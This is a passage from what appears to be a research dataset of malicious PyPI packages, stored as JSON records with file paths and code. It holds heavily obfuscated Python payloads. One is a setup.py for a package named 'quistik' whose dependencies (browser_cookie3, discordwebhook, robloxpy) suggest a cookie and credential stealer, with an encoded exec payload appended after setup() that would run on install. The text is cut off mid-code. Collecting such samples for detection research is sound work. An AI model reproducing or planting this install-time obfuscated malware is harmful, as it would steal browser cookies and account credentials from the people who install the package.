65\\\\x29\\\\167\\\\65\\\\x48\\\\70\\\\156\\\\x4c\\\\142\\\\x47\\\\x26\\\\x56\\\\117\\\\x6b\\\\107\\\\107\\\\x61\\\\x39\\\\140\\\\110\\\\x65\\\\170\\\\144\\\\x7c\\\\x47\\\\x2d\\\\x66\\\\161\\\\x37\\\\110\\\\x38\\\\x65\\\\107\\\\60\\\\x48\\\\71\\\\60\\\\150\\\\71\\\\x47\\\\143\\\\150\\\\172\\\\174\\\\110\\\\x61\\\\71\\\\x67\\\\x6d\\\\x48\\\\x65\\\\157\\\\131\\\\x33\\\\x47\\\\x47\\\\73\\\\131\\\\x31\\\\x48\\\\145\\\\x78\\\\x6b\\\\x30\\\\110\\\\x5a\\\\156\\\\101\\\\61\\\\107\\\\x63\\\\150\\\\x24\\\\127\\\\x48\\\\x65\\\\x78\\\\x6b\\\\x31\\\\110\\\\70\\\\x65\\\\x46\\\\x67\\\\x48\\\\x5a\\\\50\\\\117\\\\150\\\\110\\\\145\\\\x6f\\\\131\\\\x34\\\\x47\\\\x2d\\\\x35\\\\x50\\\\x34\\\\107\\\\x63\\\\150\\\\44\\\\x62\\\\x48\\\\x38\\\\145\\\\106\\\\x65\\\\107\\\\x63\\\\150\\\\50\\\\x65\\\\107\\\\x2d\\\\x66\\\\161\\\\x37\\\\110\\\\x38\\\\x56\\\\x43\\\\x69\\\\107\\\\53\\\\173\\\\x4d\\\\60\\\\x47\\\\x26\\\\115\\\\x46\\\\151\\\\110\\\\43\\\\163\\\\171\\\\x70\\\\110\\\\x38\\\\156\\\\x4f\\\\152\\\\x48\\\\x23\\\\71\\\\126\\\\62\\\\110\\\\70\\\\126\\\\x46\\\\152\\\\107\\\\46\\\\115\\\\71\\\\151\\\\x47\\\\46\\\\63\\\\174\\\\x59\\\\x48\\\\141\\\\71\\\\144\\\\147\\\\110\\\\x61\\\\x52\\\\x70\\\\147\\\\x47\\\\x2d\\\\x35\\\\123\\\\152\\\\x48\\\\x38\\\\x28\\\\x52\\\\147\\\\x48\\\\145\\\\170\\\\150\\\\60\\\\110\\\\x61\\\\71\\\\142\\\\65\\\\x47\\\\150\\\\137\\\\170')\",\"\",_____.__name__));________________ = _____(_______(\"\\x5f\\x5f\\137\\137\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\56\\x64\\145\\143\\157\\144\\x65(b'\\\\x54\\\\x57\\\\167\\\\x44\\\\x6c\\\\x43\\\\x47\\\\104\\\\144\\\\106\\\\x31\\\\101\\\\x48\\\\x49\\\\x79\\\\170\\\\x36\\\\x45\\\\x48\\\\171\\\\x54\\\\132\\\\x77\\\\143\\\\x44\\\\104\\\\121\\\\132\\\\150\\\\132\\\\123\\\\126\\\\150\\\\x4b\\\\110\\\\x78\\\\x6b\\\\x45\\\\166\\\\x30\\\\x64\\\\101\\\\x46\\\\x6a\\\\x66\\\\x46\\\\x52\\\\x66\\\\171\\\\x48\\\\122\\\\126\\\\x63\\\\102\\\\x4e\\\\x63\\\\101\\\\113\\\\122\\\\132\\\\x34\\\\102\\\\x46\\\\171\\\\130\\\\110\\\\x30\\\\x30\\\\170\\\\104\\\\166\\\\x4c\\\\71\\\\101\\\\121\\\\x75\\\\x58\\\\106\\\\122\\\\x35\\\\x41\\\\x49\\\\x77\\\\x5a\\\\141\\\\113\\\\x47\\\\142\\\\67\\\\132\\\\122\\\\116\\\\x6b\\\\132\\\\x51\\\\x75\\\\x54\\\\111\\\\106\\\\60\\\\147\\\\113\\\\107\\\\160\\\\142\\\\102\\\\x46\\\\x39\\\\126\\\\x48\\\\x30\\\\61\\\\x42\\\\x45\\\\x78\\\\114\\\\x7a\\\\x45\\\\x53\\\\x48\\\\x38\\\\126\\\\60\\\\x4e\\\\x6b\\\\x5a\\\\154\\\\115\\\\x4a\\\\111\\\\x6c\\\\x75\\\\114\\\\111\\\\123\\\\x4e\\\\172\\\\120\\\\170\\\\x30\\\\147\\\\103\\\\123\\\\x53\\\\123\\\\105\\\\x77\\\\142\\\\155\\\\127\\\\x76\\\\x35\\\\x56\\\\x5a\\\\120\\\\152\\\\142\\\\x5a\\\\166\\\\x4e\\\\67\\\\130\\\\x46\\\\x38\\\\167\\\\x46\\\\167\\\\x4f\\\\x4e\\\\110\\\\x51\\\\x39\\\\x6e\\\\101\\\\x76\\\\x56\\\\146\\\\x43\\\\x49\\\\x53\\\\113\\\\102\\\\111\\\\114\\\\53\\\\x57\\\\x6d\\\\x75\\\\x49\\\\x5a\\\\154\\\\x56\\\\x33\\\\x43\\\\x53\\\\146\\\\x37\\\\106\\\\167\\\\142\\\\x37\\\\x49\\\\x51\\\\x52\\\\x6d\\\\104\\\\x53\\\\x79\\\\130\\\\x4b\\\\x77\\\\x56\\\\x66\\\\106\\\\x49\\\\116\\\\171\\\\x42\\\\x48\\\\x48\\\\130\\\\107\\\\x47\\\\x31\\\\x49\\\\127\\\\154\\\\64\\\\71\\\\102\\\\x6d\\\\x79\\\\x54\\\\103\\\\110\\\\116\\\\x65\\\\x43\\\\x46\\\\x31\\\\x50\\\\113\\\\x47\\\\x30\\\\x61\\\\102\\\\122\\\\117\\\\x56\\\\127\\\\154\\\\161\\\\130\\\\x43\\\\122\\\\64\\\\x2b\\\\110\\\\x31\\\\122\\\\144\\\\x58\\\\x49\\\\x6a\\\\x30\\\\x41\\\\x50\\\\x35\\\\124\\\\101\\\\170\\\\x63\\\\101\\\\x44\\\\x78\\\\x30\\\\x37\\\\x43\\\\x46\\\\115\\\\116\\\\107\\\\x48\\\\171\\\\x44\\\\x58\\\\155\\\\x53\\\\x50\\\\x43\\\\x49\\\\x74\\\\152\\\\x5a\\\\x46\\\\x45\\\\123\\\\106\\\\110\\\\127\\\\x6f\\\\103\\\\152\\\\143\\\\x41\\\\106\\\\107\\\\104\\\\x61\\\\131\\\\154\\\\61\\\\104\\\\x56\\\\111\\\\60\\\\66\\\\130\\\\122\\\\x45\\\\112\\\\x47\\\\167\\\\x74\\\\x36\\\\x46\\\\x46\\\\x30\\\\x6a\\\\101\\\\x48\\\\104\\\\x74\\\\126\\\\110\\\\x30\\\\143\\\\x42\\\\x50\\\\116\\\\144\\\\x4b\\\\111\\\\153\\\\x58\\\\x44\\\\120\\\\x4e\\\\x76\\\\x57\\\\120\\\\x4f\\\\105\\\\x43\\\\107\\\\x30\\\\172\\\\111\\\\x76\\\\126\\\\x74\\\\111\\\\x53\\\\x6b\\\\125\\\\x41\\\\x47\\\\x4c\\\\144\\\\126\\\\110\\\\x5a\\\\x33\\\\x57\\\\x6c\\\\165\\\\x4b\\\\x49\\\\x30\\\\x49\\\\x57\\\\107\\\\167\\\\101\\\\x4b\\\\120\\\\x78\\\\x30\\\\x38\\\\x58\\\\x77\\\\127\\\\106\\\\103\\\\106\\\\x79\\\\x43\\\\111\\\\120\\\\x70\\\\x65\\\\107\\\\x6c\\\\x31\\\\112\\\\127\\\\167\\\\171\\\\131\\\\x4a\\\\167\\\\x57\\\\132\\\\131\\\\121\\\\x49\\\\157\\\\111\\\\x76\\\\114\\\\165\\\\x56\\\\x79\\\\x31\\\\x4c\\\\x42\\\\x48\\\\171\\\\x4c\\\\x49\\\\171\\\\142\\\\x69\\\\126\\\\121\\\\x71\\\\x41\\\\x46\\\\121\\\\104\\\\x66\\\\107\\\\x46\\\\111\\\\101\\\\105\\\\x53\\\\132\\\\142\\\\x4a\\\\x30\\\\x4c\\\\x61\\\\x57\\\\166\\\\x56\\\\142\\\\x43\\\\x46\\\\x78\\\\x35\\\\x59\\\\x77\\\\x72')\",\"\",_____.__name__));__________________=_____(_______(\"\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\137\\x2e\\144\\145\\143\\x6f\\x64\\x65(b'\\\\x37\\\\x33\\\\66\\\\70\\\\x34\\\\x64\\\\x35\\\\x35\\\\x37\\\\x37\\\\64\\\\142\\\\65\\\\x34\\\\x35\\\\x35\\\\65\\\\x61\\\\x34\\\\x64\\\\x35\\\\x35\\\\65\\\\65\\\\63\\\\60\\\\63\\\\65\\\\65\\\\x35\\\\x33\\\\x31\\\\x35\\\\x39\\\\63\\\\x30\\\\64\\\\145\\\\64\\\\x35\\\\x36\\\\143\\\\64\\\\64\\\\x34\\\\143\\\\x34\\\\63\\\\64\\\\x64\\\\66\\\\x37\\\\x35\\\\67\\\\x37\\\\x39\\\\x35\\\\x31\\\\x36\\\\141\\\\64\\\\146\\\\x35\\\\65\\\\x35\\\\x32\\\\x34\\\\x35\\\\65\\\\x30\\\\x34\\\\65\\\\x36\\\\x38\\\\x34\\\\x32\\\\x35\\\\x34\\\\x35\\\\x35\\\\67\\\\60\\\\x34\\\\x35\\\\64\\\\x39\\\\x33\\\\61\\\\67\\\\63\\\\63\\\\61\\\\x34\\\\142\\\\x36\\\\71\\\\66\\\\63\\\\66\\\\x63\\\\65\\\\x31\\\\67\\\\141\\\\63\\\\x34\\\\67\\\\60\\\\64\\\\x62\\\\64\\\\63\\\\x36\\\\146\\\\66\\\\x62\\\\x35\\\\x35\\\\65\\\\x34\\\\65\\\\61\\\\67\\\\x34\\\\64\\\\x66\\\\x35\\\\66\\\\x34\\\\x36\\\\65\\\\x38\\\\x35\\\\x34\\\\x34\\\\63\\\\65\\\\62\\\\x36\\\\63\\\\65\\\\x31\\\\64\\\\65\\\\x33\\\\x39\\\\x34\\\\x32\\\\65\\\\61\\\\65\\\\x34\\\\67\\\\x33\\\\66\\\\x64\\\\64\\\\x64\\\\x37\\\\141\\\\x36\\\\67\\\\66\\\\71\\\\65\\\\61\\\\66\\\\x63\\\\65\\\\66\\\\64\\\\x39\\\\64\\\\x61\\\\x35\\\\61\\\\67\\\\x30\\\\x34\\\\x65\\\\x34\\\\x61\\\\x33\\\\61\\\\66\\\\146\\\\x37\\\\x39\\\\x35\\\\70\\\\x36\\\\x39\\\\64\\\\62\\\\x34\\\\x63\\\\65\\\\65\\\\x33\\\\x31\\\\x33\\\\x30\\\\x37\\\\60\\\\64\\\\144\\\\65\\\\66\\\\63\\\\64\\\\67\\\\141\\\\65\\\\x34\\\\67\\\\x39\\\\67\\\\x38\\\\x34\\\\146\\\\64\\\\143\\\\65\\\\x34\\\\x34\\\\x31\\\\x33\\\\x30\\\\65\\\\x36\\\\64\\\\x34\\\\x33\\\\65\\\\x34\\\\x65\\\\x34\\\\144\\\\65\\\\64\\\\x36\\\\x38\\\\x36\\\\65\\\\64\\\\x61\\\\x36\\\\143\\\\66\\\\142\\\\67\\\\x30\\\\64\\\\142\\\\64\\\\64\\\\x34\\\\141\\\\x36\\\\x36\\\\65\\\\60\\\\67\\\\141\\\\65\\\\65\\\\x37\\\\61\\\\x35\\\\x33\\\\x33\\\\60\\\\64\\\\66\\\\64\\\\70\\\\65\\\\x30\\\\x34\\\\66\\\\65\\\\65\\\\x33\\\\x38\\\\x34\\\\x65\\\\x33\\\\60\\\\65\\\\x35\\\\66\\\\x39\\\\65\\\\x31\\\\65\\\\66\\\\65\\\\62\\\\65\\\\63\\\\x34\\\\x61\\\\x34\\\\x35\\\\x34\\\\66\\\\x34\\\\61\\\\64\\\\x66\\\\64\\\\x33\\\\x35\\\\62\\\\64\\\\64\\\\64\\\\x65\\\\x33\\\\x31\\\\64\\\\71\\\\x33\\\\x33\\\\65\\\\67\\\\x35\\\\x34\\\\x37\\\\x33\\\\66\\\\x62\\\\64\\\\145\\\\x37\\\\71\\\\x34\\\\145\\\\x34\\\\x34\\\\x34\\\\x33\\\\66\\\\142\\\\x33\\\\61\\\\x35\\\\141\\\\x34\\\\144\\\\63\\\\x31\\\\x33\\\\x30\\\\x37\\\\x39\\\\x34\\\\146\\\\66\\\\x62\\\\x36\\\\143\\\\65\\\\62\\\\x35\\\\x31\\\\x36\\\\141\\\\64\\\\x64\\\\63\\\\x32\\\\x35\\\\60\\\\64\\\\64\\\\x37\\\\60\\\\x34\\\\145\\\\x35\\\\x38\\\\66\\\\x61\\\\66\\\\63\\\\x33\\\\x35\\\\x34\\\\x65\\\\67\\\\x39\\\\66\\\\67\\\\66\\\\x61\\\\65\\\\x32\\\\64\\\\66\\\\67\\\\63\\\\67\\\\70\\\\x35\\\\x37\\\\65\\\\65\\\\66\\\\143\\\\x34\\\\x34\\\\64\\\\146\\\\x34\\\\x35\\\\x35\\\\x32\\\\64\\\\70\\\\64\\\\x61\\\\x37\\\\x61\\\\x36\\\\143\\\\x34\\\\61\\\\x34\\\\x66\\\\66\\\\x61\\\\66\\\\x66\\\\63\\\\65\\\\x35\\\\x30\\\\66\\\\143\\\\x37\\\\x34\\\\x35\\\\x39\\\\x35\\\\x31\\\\x33\\\\61\\\\x35\\\\x39\\\\63\\\\67\\\\x34\\\\144\\\\65\\\\64\\\\x34\\\\x64\\\\63\\\\60\\\\64\\\\141\\\\63\\\\60\\\\64\\\\145\\\\x35\\\\62\\\\x34\\\\145\\\\x35\\\\65\\\\64\\\\71\\\\x37\\\\61\\\\x35\\\\x35\\\\66\\\\141\\\\64\\\\x65\\\\64\\\\143\\\\x35\\\\65\\\\x34\\\\66\\\\67\\\\63\\\\x36\\\\x39\\\\x34\\\\143\\\\x36\\\\143\\\\x35\\\\x36\\\\x34\\\\x33\\\\64\\\\x65\\\\63\\\\60\\\\x35\\\\65\\\\64\\\\142\\\\65\\\\64\\\\x35\\\\65\\\\66\\\\x38\\\\65\\\\60\\\\65\\\\63\\\\x35\\\\63\\\\x37\\\\x33\\\\63\\\\62\\\\64\\\\x65\\\\66\\\\143\\\\x33\\\\x38\\\\67\\\\x35\\\\x34\\\\x64\\\\x36\\\\x63\\\\66\\\\x38\\\\x35\\\\67\\\\64\\\\x65\\\\x37\\\\x61\\\\x35\\\\x61\\\\x34\\\\65\\\\65\\\\x34\\\\x36\\\\x61\\\\x37\\\\67\\\\x33\\\\71\\\\64\\\\x64\\\\x36\\\\x62\\\\66\\\\x34\\\\65\\\\63\\\\x35\\\\x33\\\\x35\\\\x33\\\\67\\\\67\\\\63\\\\x34\\\\65\\\\65\\\\65\\\\x35\\\\64\\\\144\\\\x37\\\\64\\\\x35\\\\64\\\\x34\\\\x34\\\\x33\\\\x31\\\\65\\\\x31\\\\64\\\\146\\\\x33\\\\x31\\\\65\\\\x35\\\\x37\\\\x61\\\\65\\\\65\\\\x34\\\\65\\\\65\\\\61\\\\x36\\\\71\\\\x34\\\\144\\\\x36\\\\143\\\\x36\\\\70\\\\66\\\\66\\\\x34\\\\x65\\\\63\\\\60\\\\x36\\\\70\\\\64\\\\70\\\\x35\\\\x31\\\\x36\\\\x39\\\\x35\\\\x39\\\\67\\\\63\\\\x35\\\\x34\\\\65\\\\x34\\\\63\\\\70\\\\x33\\\\x36\\\\x35\\\\x38\\\\x35\\\\x34\\\\x36\\\\63\\\\67\\\\65\\\\x34\\\\x66\\\\64\\\\66\\\\63\\\\60\\\\x37\\\\65\\\\65\\\\60\\\\67\\\\71\\\\66\\\\143\\\\x34\\\\x38\\\\65\\\\65\\\\64\\\\64\\\\x36\\\\70\\\\64\\\\63\\\\65\\\\x38\\\\66\\\\x37\\\\67\\\\x30\\\\x34\\\\x65\\\\65\\\\x36\\\\66\\\\x63\\\\x34\\\\141\\\\x35\\\\60\\\\65\\\\x32\\\\65\\\\63\\\\x35\\\\x35\\\\62\\\\x62\\\\x35\\\\63\\\\64\\\\66\\\\x34\\\\x31\\\\x33\\\\x38\\\\64\\\\143\\\\x36\\\\x63\\\\63\\\\x39\\\\65\\\\64\\\\65\\\\65\\\\x34\\\\x36\\\\x36\\\\x33\\\\x33\\\\x37\\\\64\\\\x64\\\\x34\\\\x33\\\\x34\\\\x39\\\\67\\\\70\\\\x34\\\\143\\\\x34\\\\x36\\\\64\\\\62\\\\64\\\\x35\\\\x35\\\\64\\\\x36\\\\x39\\\\x34\\\\x64\\\\x36\\\\x37\\\\64\\\\144\\\\x36\\\\x39\\\\66\\\\64\\\\x34\\\\71\\\\64\\\\144\\\\x36\\\\x61\\\\x34\\\\x65\\\\65\\\\x37\\\\x34\\\\x66\\\\65\\\\63\\\\x36\\\\142\\\\67\\\\67\\\\x34\\\\142\\\\x35\\\\63\\\\x34\\\\145\\\\66\\\\x33\\\\x35\\\\64\\\\x37\\\\71\\\\x35\\\\62\\\\x34\\\\x35\\\\x35\\\\x36\\\\64\\\\63\\\\x35\\\\71\\\\x37\\\\x61\\\\x35\\\\x35\\\\x35\\\\64\\\\x34\\\\145\\\\x34\\\\x66\\\\x34\\\\x66\\\\x35\\\\x34\\\\64\\\\x35\\\\x37\\\\x33\\\\x34\\\\x62\\\\65\\\\64\\\\65\\\\x31\\\\x33\\\\63\\\\x35\\\\70\\\\x36\\\\143\\\\64\\\\x64\\\\67\\\\63\\\\x35\\\\x31\\\\66\\\\x39\\\\65\\\\141\\\\65\\\\67\\\\65\\\\x38\\\\65\\\\66\\\\65\\\\71\\\\x33\\\\x38\\\\x34\\\\x33\\\\66\\\\142\\\\63\\\\x31\\\\x35\\\\64\\\\65\\\\x36\\\\x36\\\\x61\\\\x33\\\\70\\\\66\\\\x37\\\\65\\\\65\\\\64\\\\x34\\\\65\\\\x39\\\\66\\\\67\\\\64\\\\143\\\\x33\\\\x30\\\\63\\\\65\\\\x34\\\\71\\\\x35\\\\65\\\\x35\\\\66\\\\63\\\\x31\\\\x36\\\\x34\\\\64\\\\144\\\\66\\\\x62\\\\67\\\\67\\\\67\\\\70\\\\64\\\\x61\\\\x35\\\\63\\\\x36\\\\67\\\\x36\\\\x63\\\\64\\\\x39\\\\x36\\\\143\\\\63\\\\70\\\\66\\\\143\\\\65\\\\x31\\\\64\\\\65\\\\63\\\\65\\\\x35\\\\x35\\\\x35\\\\x38\\\\64\\\\x33\\\\x36\\\\x34\\\\x36\\\\x35\\\\64\\\\x65\\\\x36\\\\x39\\\\66\\\\142\\\\x33\\\\61\\\\x35\\\\x36\\\\150')\",\"\",_____.__name__));______________=_____(_______(\"\\137\\137\\x5f\\137\\137\\x5f\\137\\137\\137\\x5f\\x5f\\x2e\\144\\145\\x63\\x6f\\x64\\x65(b'\\\\x62\\\\x65\\\\147\\\\x69\\\\156\\\\40\\\\66\\\\66\\\\x36\\\\x20\\\\74\\\\144\\\\x61\\\\164\\\\141\\\\76\\\\12\\\\115\\\\66\\\\x36\\\\125\\\\66\\\\x3b\\\\106\\\\x25\\\\67\\\\x2d\\\\x26\\\\75\\\\56\\\\72\\\\105\\\\104\\\\x52\\\\x32\\\\x34\\\\x31\\\\x58\\\\x3a\\\\125\\\\105\\\\70\\\\x34\\\\x46\\\\101\\\\x30\\\\71\\\\x57\\\\41\\\\x2e\\\\63\\\\64\\\\x35\\\\x36\\\\62\\\\x45\\\\55\\\\x23\\\\55\\\\x27\\\\111\\\\x2a\\\\64\\\\x54\\\\x34\\\\x52\\\\63\\\\66\\\\x49\\\\113\\\\76\\\\x44\\\\131\\\\112\\\\x33\\\\x37\\\\x3d\\\\x2f\\\\x0a\\\\x4d\\\\x3a\\\\x44\\\\104\\\\125\\\\62\\\\124\\\\55\\\\x21\\\\71\\\\x55\\\\x29\\\\x4c\\\\x35\\\\x45\\\\41\\\\x31\\\\x30\\\\126\\\\61\\\\106\\\\x35\\\\x23\\\\x25\\\\114\\\\x39\\\\105\\\\101\\\\x49\\\\60\\\\x36\\\\x41\\\\x2a\\\\54\\\\x33\\\\61\\\\x48\\\\64\\\\x23\\\\40\\\\x59\\\\71\\\\64\\\\x59\\\\x4b\\\\x2e\\\\66\\\\65\\\\x37\\\\x2c\\\\63\\\\x45\\\\65\\\\x32\\\\64\\\\x31\\\\42\\\\x36\\\\64\\\\x45\\\\x25\\\\x0a\\\\x4d\\\\66\\\\104\\\\55\\\\61\\\\61\\\\105\\\\x45\\\\120\\\\x33\\\\65\\\\x34\\\\124\\\\72\\\\125\\\\51\\\\x24\\\\x34\\\\66\\\\x41\\\\43\\\\72\\\\x53\\\\41\\\\123\\\\63\\\\x37\\\\x45\\\\113\\\\74\\\\124\\\\115\\\\x4a\\\\x3b\\\\44\\\\55\\\\57\\\\x35\\\\44\\\\x59\\\\x31\\\\x33\\\\x37\\\\x49\\\\x32\\\\65\\\\65\\\\x41\\\\x33\\\\x3b\\\\45\\\\111\\\\x2b\\\\61\\\\x43\\\\x21\\\\115\\\\x33\\\\x35\\\\x2c\\\\130\\\\x0a\\\\115\\\\54\\\\45\\\\x21\\\\x4b\\\\x3b\\\\44\\\\111\\\\x32\\\\61\\\\46\\\\x4d\\\\x4d\\\\63\\\\67\\\\111\\\\x4f\\\\x3d\\\\x54\\\\x5d\\\\112\\\\x3b\\\\x57\\\\75\\\\66\\\\61\\\\x24\\\\x55\\\\x5a\\\\63\\\\105\\\\x2c\\\\x50\\\\x3b\\\\x35\\\\x29\\\\x4a\\\\63\\\\67\\\\x49\\\\x2d\\\\x31\\\\x26\\\\x5d\\\\107\\\\63\\\\x56\\\\105\\\\130\\\\x31\\\\125\\\\45\\\\43\\\\60\\\\66\\\\75\\\\x2f\\\\x3a\\\\63\\\\41\\\\x47\\\\12\\\\115\\\\62\\\\64\\\\55\\\\x21\\\\76\\\\x34\\\\x5d\\\\112\\\\64\\\\x34\\\\x4d\\\\64\\\\x35\\\\45\\\\51\\\\x31\\\\64\\\\x35\\\\65\\\\x4f\\\\74\\\\64\\\\x45\\\\x23\\\\x33\\\\x37\\\\x21\\\\62\\\\x30\\\\124\\\\x25\\\\x47\\\\63\\\\45\\\\x2d\\\\x21\\\\x39\\\\x55\\\\41\\\\x4b\\\\71\\\\126\\\\75\\\\x29\\\\60\\\\x54\\\\x25\\\\x55\\\\x32\\\\x46\\\\115\\\\x3a\\\\x31\\\\124\\\\125\\\\65\\\\62\\\\x37\\\\x2d\\\\53\\\\x0a\\\\115\\\\x35\\\\66\\\\x51\\\\x21\\\\62\\\\x54\\\\61\\\\x47\\\\x3a\\\\x24\\\\x51\\\\x33\\\\75\\\\x56\\\\135\\\\65\\\\x31\\\\44\\\\x55\\\\113\\\\x35\\\\x36\\\\x45\\\\x3a\\\\x31\\\\x54\\\\x55\\\\x35\\\\x39\\\\x53\\\\71\\\\51\\\\61\\\\x46\\\\x3c\\\\x56\\\\x33\\\\x56\\\\x49\\\\x4b\\\\73\\\\x34\\\\x4d\\\\46\\\\x30\\\\x44\\\\x3d\\\\x32\\\\72\\\\x34\\\\51\\\\x22\\\\64\\\\64\\\\x2d\\\\x32\\\\65\\\\x35\\\\65\\\\x21\\\\12\\\\x4d\\\\74\\\\44\\\\x59\\\\61\\\\76\\\\64\\\\x35\\\\x53\\\\x33\\\\x37\\\\105\\\\107\\\\x2d\\\\x44\\\\135\\\\x33\\\\x36\\\\x44\\\\51\\\\x33\\\\x30\\\\x53\\\\100\\\\x54\\\\65\\\\123\\\\x20\\\\121\\\\65\\\\x55\\\\51\\\\x34\\\\x3c\\\\x25\\\\71\\\\x31\\\\x30\\\\x57\\\\x21\\\\55\\\\64\\\\105\\\\x34\\\\121\\\\61\\\\104\\\\x55\\\\x4c\\\\61\\\\x36\\\\x45\\\\63\\\\61\\\\x37\\\\x41\\\\55\\\\x33\\\\104\\\\x31\\\\61\\\\12\\\\x4d\\\\x3a\\\\124\\\\111\\\\x34\\\\61\\\\104\\\\61\\\\67\\\\x31\\\\105\\\\x39\\\\61\\\\x34\\\\63\\\\45\\\\x43\\\\54\\\\x44\\\\111\\\\x4c\\\\71\\\\44\\\\75\\\\x2d\\\\x3b\\\\x24\\\\45\\\\x4c\\\\64\\\\104\\\\61\\\\107\\\\56\\\\64\\\\x51\\\\65\\\\55\\\\x23\\\\x35\\\\x35\\\\x3a\\\\126\\\\121\\\\43\\\\64\\\\x46\\\\105\\\\55\\\\x39\\\\x54\\\\55\\\\113\\\\x2c\\\\x23\\\\101\\\\61\\\\x30\\\\x54\\\\124\\\\120\\\\x0a\\\\x4d\\\\63\\\\124\\\\61\\\\x54\\\\x35\\\\x35\\\\x31\\\\44\\\\54\\\\64\\\\115\\\\x30\\\\x3e\\\\x45\\\\111\\\\x35\\\\x34\\\\64\\\\55\\\\x44\\\\71\\\\64\\\\134\\\\121\\\\x3c\\\\127\\\\41\\\\x34\\\\x3e\\\\x35\\\\105\\\\x59\\\\63\\\\64\\\\x30\\\\x54\\\\74\\\\124\\\\x5d\\\\43\\\\75\\\\x57\\\\101\\\\53\\\\x34\\\\x56\\\\x3c\\\\x54\\\\x34\\\\45\\\\x39\\\\42\\\\x36\\\\x24\\\\121\\\\114\\\\x32\\\\104\\\\65\\\\54\\\\12\\\\x4d\\\\x3e\\\\66\\\\x5c\\\\124\\\\63\\\\x37\\\\111\\\\46\\\\60\\\\x45\\\\51\\\\x24\\\\60\\\\x45\\\\x39\\\\x35\\\\65\\\\63\\\\100\\\\113\\\\x35\\\\x43\\\\x21\\\\x29\\\\55\\\\x35\\\\75\\\\65\\\\x2c\\\\65\\\\55\\\\63\\\\76\\\\x35\\\\x29\\\\63\\\\x35\\\\105\\\\x2d\\\\61\\\\x32\\\\125\\\\61\\\\x33\\\\75\\\\127\\\\65\\\\x2f\\\\72\\\\106\\\\x4d\\\\x53\\\\65\\\\x55\\\\x39\\\\127\\\\74\\\\x55\\\\x3d\\\\46\\\\12\\\\x2d\\\\66\\\\x45\\\\101\\\\52\\\\x3a\\\\104\\\\124\\\\121\\\\x35\\\\64\\\\55\\\\117\\\\55\\\\x44\\\\x49\\\\63\\\\76\\\\40\\\\x20\\\\40\\\\12\\\\x20\\\\x0a\\\\x65\\\\156\\\\144\\\\x0a\\\\165')\",\"\",_____.__name__));_______________=_____(_______(\"\\163\\164\\x72\\56\\152\\157\\151\\156('', \\133\\137\\x5f\\137\\x5f\\x5f\\x5f\\137\\137\\137\\137\\x5f\\x5f\\50\\x78\\51\\40\\146\\157\\x72\\x20\\x78\\x20\\151\\x6e\\x20\\x5b\\x5f\\137\\137\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\54\\137\\137\\x5f\\x5f\\137\\x5f\\137\\137\\137\\x5f\\137\\137\\x5f\\137\\x5f\\x5f\\x2c\\137\\x5f\\137\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\137\\x5f\\54\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\x5f\\137\\137\\137\\x5f\\x5d\\x5d)\",\"\", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), \"\\x75\\165\"),\"\\142\\x7a\\62\"),____________________)[_____(\"\\x46\\x61\\154\\x73\\x65\")])"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-15-quistik",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='quistik', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\x65\\166\\141\\154\");_______=_____(\"\\143\\x6f\\155\\x70\\x69\\x6c\\x65\");______,____=_____(_______(\"\\137\\137\\x69\\155\\x70\\x6f\\162\\164\\x5f\\137\\x28\\47\\x62\\141\\163\\145\\x36\\x34\\47\\51\",\"\",_____.__name__)),_____(_______(\"\\137\\137\\151\\x6d\\160\\157\\x72\\164\\137\\x5f\\50\\x27\\x63\\157\\144\\x65\\143\\163\\47\\51\",\"\",_____.__name__));____________________=_____(\"'\\40\\x78\\145\\x48\\x4a\\x71\\60\\71\\125'\");________,_________,__________,___________=_____(_______(\"\\145\\170\\x65\\x63\",\"\",_____.__name__)),_____(_______(\"\\x73\\164\\162\\56\\x65\\x6e\\x63\\x6f\\144\\x65\",\"\",_____.__name__)),_____(_______(\"\\151\\163\\151\\x6e\\163\\x74\\x61\\156\\x63\\x65\",\"\",_____.__name__)),_____(_______(\"\\142\\x79\\x74\\x65\\163\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\40\":\n        ___________=\"\\40\"+___________\n    for _ in range(_____(\"\\154\\145\\156\\50\\x5f\\x5f\\x5f\\137\\x5f\\137\\137\\137\\x5f\\137\\51\")):\n        _________+=_____(\"\\143\\x68\\x72\\x28\\157\\x72\\x64\\50\\137\\x5f\\x5f\\137\\137\\137\\x5f\\137\\137\\137\\x5b\\137\\135\\x29\\x5e\\157\\162\\x64\\x28\\x5f\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5b\\x28\\x6c\\145\\x6e\\x28\\137\\x5f\\x5f\\137\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\51\\40\\55\\x20\\124\\162\\165\\145\\x2a\\x32\\x29\\x20\\53\\40\\124\\162\\x75\\x65\\x5d\\51\\51\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\143\\x5f\\137\\137\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\137\\137\\x36\\x73\\65\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\137\\x5f\\137\\137\\137\\137\\x5f\\137\\x36\\141\\162\\144\\166\\70'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = 